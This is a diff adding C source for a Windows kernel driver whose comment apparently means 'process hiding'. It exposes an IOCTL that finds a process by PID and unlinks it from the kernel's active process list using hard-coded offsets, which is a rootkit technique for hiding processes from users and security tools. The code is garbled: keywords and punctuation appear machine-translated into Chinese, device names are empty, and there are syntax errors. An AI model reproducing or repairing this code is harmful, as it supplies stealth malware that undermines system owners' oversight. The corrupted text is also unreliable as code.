@@ -0,0 +1,131 @@
// ½ø³ÌÒþ²Ø
＃定义 DEBUGMSG
＃包括 < ntddk.h >
＃定义 DWORD ULONG
＃定义 NT_DEVICE_NAME          
＃定义 DOS_DEVICE_NAME         


void  DriverUnloAd（IN PDRIVER_OBJECT Driver_object）;
NTSTATUS DriverDispAtch（IN PDEVICE_OBJECT DeviceObject，IN PIRP Irp）;
NTSTATUS myDriverIoControl（IN PDEVICE_OBJECT DeviceObject，IN PIRP Irp）;
DWORD FindProcessEPROC（int Terminate_PID）;
整数 PIDOFFSET = 0x84 ;
int FLINKOFFSET = 0x88 ;
PDEVICE_OBJECT KingObject = NULL ;

NTSTATUS DriverEntry（IN PDRIVER_OBJECT DriverObject，IN PUNICODE_STRING RegistryPath）
{
    PUNICODE_STRING pString;
    UNICODE_STRING ntDeviceName;
    UNICODE_STRING win32DeviceName;
    NTSTATUS状态；

    RtlInitUnicodeString（＆ntDeviceName，NT_DEVICE_NAME）;
    DbgPrint（“ Start / n ”）;

    if（！NT_SUCCESS（状态= IoCreateDevice（DriverObject，0，＆ntDeviceName，FILE_DEVICE_UNKNOWN，0，FALSE，＆KingObject）））
    返回 STATUS_NO_SUCH_DEVICE;
    DbgPrint（“ IoCreateDevice：％x / n ”，状态）;

    RtlInitUnicodeString（＆win32DeviceName，DOS_DEVICE_NAME）;

    if（！NT_SUCCESS（状态= IoCreateSymbolicLink（＆win32DeviceName，＆ntDeviceName）））
    返回 STATUS_NO_SUCH_DEVICE;
    DbgPrint（“ IoCreateSymbolicLink：％x / n ”，状态）；

    DriverObject-> MajorFunction [IRP_MJ_CREATE] = DriverObject-> MajorFunction [IRP_MJ_CLOSE] = DriverDispAtch;
    DriverObject-> MajorFunction [IRP_MJ_DEVICE_CONTROL] = myDriverIoControl;
    DriverObject-> DriverUnload = DriverUnloAd;

    返回 STATUS_SUCCESS;
}

NTSTATUS myDriverIoControl（IN PDEVICE_OBJECT DeviceObject，IN PIRP Irp）
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    PIO_STACK_LOCATION堆栈；
    DWORD * in_buffer，* out_buffer;
    ULONG代码，out_size;
    DWORD eproc = 0 ;
    PLIST_ENTRY plist_active_procs;



    stack = IoGetCurrentIrpStackLocation（Irp）;
    out_size = stack-> 参数。DeviceIoControl。OutputBufferLength ;
    code = stack-> 参数。DeviceIoControl。IoControlCode ;

    in_buffer = out_buffer = Irp-> AssociatedIrp。SystemBuffer ;

    如果（code == 800）
    {
        DWORD PID = * in_buffer;
        eproc = FindProcessEPROC（PID）;
        如果（eproc == 0）
        {
            Irp-> IoStatus。状态 = ntStatus;
            IoCompleteRequest（Irp，IO_NO_INCREMENT）;
            返回 ntStatus;
        }
        plist_active_procs = {LIST_ENTRY *）（eproc + FLINKOFFSET）;
        *（（（DWORD *）plist_active_procs-> 闪烁）=（（DWORD）plist_active_procs-> Flink ;
        *（（（DWORD *）plist_active_procs-> Flink + 1）=（（DWORD）plist_active_procs-> Blink ;
        Irp-> IoStatus。状态 = ntStatus;
        IoCompleteRequest（Irp，IO_NO_INCREMENT）;
        返回 ntStatus;
    }
     * out_buffer = 0 ;
     Irp-> IoStatus。信息 = 4 ;
     ntStatus = STATUS_INVALID_DEVICE_REQUEST;

    返回 ntStatus;
}

NTSTATUS DriverDispAtch（IN PDEVICE_OBJECT DeviceObject，IN PIRP Irp）
{
    Irp-> IoStatus。状态 = STATUS_SUCCESS;
    IoCompleteRequest（Irp，IO_NO_INCREMENT）;
    返回 STATUS_SUCCESS;
}

VOID DriverUnloAd（IN PDRIVER_OBJECT DriverObject）
{
    UNICODE_STRING win32DeviceName;

    RtlInitUnicodeString（＆win32DeviceName，DOS_DEVICE_NAME）;
    IoDeleteSymbolicLink（＆win32DeviceName）;

    IoDeleteDevice（KingObject）;
    回报 ;
}

DWORD FindProcessEPROC（int终止_PID）
{
    DWORD eproc = 0 ;
    int current_PID = 0 ;
    int start_PID = 0 ;
    int i_count = 0 ;
    PLIST_ENTRY plist_active_procs;
    如果（terminate_PID == 0）返回 Terminate_PID;
    eproc =（DWORD）PsGetCurrentProcess（）;
    start_PID = *（（（DWORD *）（eproc + PIDOFFSET）））;
    current_PID = start_PID;

    而（1）
    {
        如果（terminate_PID == current_PID）返回 eproc;
        否则 如果（（i_count> = 1）&&（start_PID == current_PID））
        {
            返回 0 ;
        }
        其他
        {
            plist_active_procs = {LIST_ENTRY *）（eproc + FLINKOFFSET）;
            eproc =（DWORD）plist_active_procs-> Flink ;
            eproc = eproc-FLINKOFFSET;
            current_PID = *（（int *）（eproc + PIDOFFSET））;
            i_count ++;
        }
    }
} 
